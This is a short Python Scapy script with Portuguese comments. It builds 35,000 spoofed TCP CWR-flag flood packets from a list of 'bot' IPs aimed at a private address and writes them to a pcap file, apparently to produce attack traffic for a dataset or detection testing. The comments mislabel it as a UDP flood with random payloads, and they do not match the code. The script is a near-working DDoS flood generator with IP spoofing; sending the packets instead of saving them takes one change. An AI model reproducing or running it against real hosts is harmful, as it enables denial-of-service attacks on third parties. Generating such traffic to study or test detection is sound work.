from scapy.all import *
import scapy
import random
import time
import sys
import ipaddress

# Ataque simples UDP Flood, com tamanho do payload aleatório e
# string aleatória como carga.
# IP Spoofing, RandomSRCPort e 3000 bots.

# CONFIGURAÇÃO DO ATAQUE
TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"

TARGET_MAC = "ff:ff:ff:ff:ff:ff"


PCAP_FILENAME = "tcp_cwr_flood.pcap"

def load_bots(filename):
    """Colocar os bots do arquivo em uma lista."""
    bot_ips = []

    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)

    return bot_ips

def run_tcp_flood_attack():
    """TCP Flood Attack"""
    bot_ips = load_bots(BOTFILE)

    numero_de_pacotes_enviados = 0

    lista_de_pacotes = []

    while True:
        source_ip = random.choice(bot_ips)

        eth_layer = Ether(dst=TARGET_MAC)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        seq_num = random.randint(0, 4294967295)
        tcp_layer = TCP(sport=RandShort(),dport=TARGET_PORT, flags='C', seq=seq_num, window=8192)


        packet = eth_layer / ip_layer / tcp_layer 

        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if(numero_de_pacotes_enviados == 35000):
            break


    print(f"Gerando arquivo PCAP com {numero_de_pacotes_enviados} pacotes...")
    wrpcap(PCAP_FILENAME, lista_de_pacotes)
    print(f"Arquivo PCAP '{PCAP_FILENAME}' gerado com sucesso.")



if __name__ == "__main__":
    run_tcp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 simple_udp_flood.py